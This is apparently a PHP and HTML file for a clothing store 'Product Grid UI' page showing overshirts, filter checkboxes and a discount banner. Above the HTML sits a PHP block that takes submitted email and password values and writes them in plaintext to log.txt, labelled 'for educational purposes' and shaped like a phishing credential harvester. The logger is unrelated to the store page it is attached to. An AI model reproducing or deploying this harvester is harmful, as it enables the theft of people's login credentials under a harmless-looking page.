<?php
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Log the captured data (for educational purposes)
    $file = fopen("log.txt", "a");
    fwrite($file, "Email: $email | Password: $password\n");
    fclose($file);
    
    // echo "Login failed. Please try again.";

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Product Grid UI</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    header {
      background-color: #000;
      color: #fff;
      text-align: center;
      padding: 10px 0;
      font-size: 18px;
      position: sticky;
      top: 0;
      z-index: 100;
    }

    .container {
      display: flex;
      padding: 20px;
    }

    .sidebar {
      width: 20%;
      padding-right: 20px;
    }

    .sidebar h3 {
      font-size: 18px;
      margin-bottom: 10px;
    }

    .sidebar ul {
      list-style: none;
      padding: 0;
    }

    .sidebar li {
      margin-bottom: 10px;
    }

    .sidebar label {
      cursor: pointer;
    }

    .product-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      width: 80%;
    }

    .product-card {
      border: 1px solid #ddd;
      border-radius: 8px;
      overflow: hidden;
      text-align: center;
      padding: 10px;
    }

    .product-card img {
      width: 100%;
      height: auto;
    }

    .product-card h4 {
      margin: 10px 0;
      font-size: 16px;
    }

    .product-card p {
      font-size: 14px;
      color: #555;
    }

    .product-card .price {
      font-size: 18px;
      font-weight: bold;
      margin: 10px 0;
    }

    .product-card .sizes {
      font-size: 14px;
    }

    .product-card .sizes span {
      margin: 0 5px;
    }
  </style>
</head>
<body>
  <header>
    GET 10% OFF ON YOUR FIRST PURCHASE - USE CODE: APP10
  </header>
  <div class="container">
    <aside class="sidebar">
      <h3>Collections</h3>
      <ul>
        <li><label><input type="checkbox"> Overshirt</label></li>
        <li><label><input type="checkbox"> Jackets</label></li>
        <li><label><input type="checkbox"> Hoodies</label></li>
        <li><label><input type="checkbox"> Sweaters</label></li>
        <li><label><input type="checkbox"> Sweatshirts</label></li>
      </ul>
      <h3>Size</h3>
      <ul>
        <li><label><input type="checkbox"> S</label></li>
        <li><label><input type="checkbox"> M</label></li>
        <li><label><input type="checkbox"> L</label></li>
        <li><label><input type="checkbox"> XL</label></li>
        <li><label><input type="checkbox"> XXL</label></li>
      </ul>
      <h3>Fit</h3>
      <ul>
        <li><label><input type="checkbox"> Regular Fit</label></li>
        <li><label><input type="checkbox"> Relaxed Fit</label></li>
        <li><label><input type="checkbox"> Slim Fit</label></li>
      </ul>
    </aside>
    <main class="product-grid">
      <div class="product-card">
        <img src="https://via.placeholder.com/200" alt="Light Pink Checks">
        <h4>Light Pink Checks Relaxed Fit Overshirt</h4>
        <p class="price">INR 1,199</p>
        <p class="sizes">S M L XL XXL</p>
      </div>
      <div class="product-card">
        <img src="https://via.placeholder.com/200" alt="Light Brown Checks">
        <h4>Light Brown Checks Relaxed Fit Overshirt</h4>
        <p class="price">INR 1,199</p>
        <p class="sizes">S M L XL XXL</p>
      </div>
      <div class="product-card">
        <img src="https://via.placeholder.com/200" alt="Grey Checks">
        <h4>Grey Checks Relaxed Fit Overshirt</h4>
        <p class="price">INR 1,199</p>
        <p class="sizes">S M L XL XXL</p>
      </div>
      <div class="product-card">
        <img src="https://via.placeholder.com/200" alt="Brown Checks">
        <h4>Brown Checks Relaxed Fit Overshirt</h4>
        <p class="price">INR 1,199</p>
        <p class="sizes">S M L XL XXL</p>
      </div>
    </main>
  </div>
</body>
</html>


<?php

?>
